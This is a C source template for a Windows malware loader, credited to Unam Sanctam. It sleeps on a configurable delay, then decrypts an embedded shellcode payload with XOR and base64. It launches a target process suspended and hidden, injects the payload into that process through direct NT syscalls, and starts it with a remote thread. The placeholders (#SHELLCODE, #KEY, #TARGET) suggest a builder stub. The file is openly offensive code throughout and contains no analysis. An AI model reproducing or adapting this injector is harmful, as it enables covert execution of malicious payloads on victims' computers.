#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/types.h>
#include "Includes/syscalls.h"

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

char* base64_decode(char* cipher) {
    char counts = 0;
    char buffer[4];
    char* plain = malloc(strlen(cipher) * 3 / 4);
    int i = 0, p = 0;
    for(i = 0; cipher[i] != '\0'; i++) {
        char k;
        for(k = 0 ; k < 64 && base46_map[k] != cipher[i]; k++);
        buffer[counts++] = k;
        if(counts == 4) {
            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
            if(buffer[2] != 64)
                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
            if(buffer[3] != 64)
                plain[p++] = (buffer[2] << 6) + buffer[3];
            counts = 0;
        }
    }
    plain[p] = '\0';
    return plain;
}

char* cipher(char* data, long dataLen) {
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; i++) {
		output[i] = data[i] ^ "#KEY"[i % #KEYLENGTH];
	}
	return output;
}

int main(int argc, char** argv) {
	Sleep(#DELAY * 1000);

	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info = {sizeof(s_info)};
	LPVOID apointer = NULL;
	SIZE_T size = #SHELLCODELENGTH;
	SIZE_T bytes = 0;
	HANDLE hThread;
	TCHAR injectpath[MAX_PATH*2];
	TCHAR args[MAX_PATH*2];

	sprintf(injectpath, cipher("#FORMAT1", #FORMAT1LENGTH), getenv(cipher("#ENV", #ENVLENGTH)), cipher("#TARGET", #TARGETLENGTH));
	sprintf(args, cipher("#FORMAT2", #FORMAT2LENGTH), injectpath, #ARGS);
	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
	NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(p_info.hProcess, apointer, cipher(base64_decode("#SHELLCODE"), #SHELLCODELENGTH), #SHELLCODELENGTH, &bytes);
	NtProtectVirtualMemory(p_info.hProcess, &apointer, &bytes, PAGE_EXECUTE, NULL);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, apointer, FALSE, 0, 0, 0, NULL);
	NtClose(p_info.hProcess);
	NtClose(p_info.hThread);
}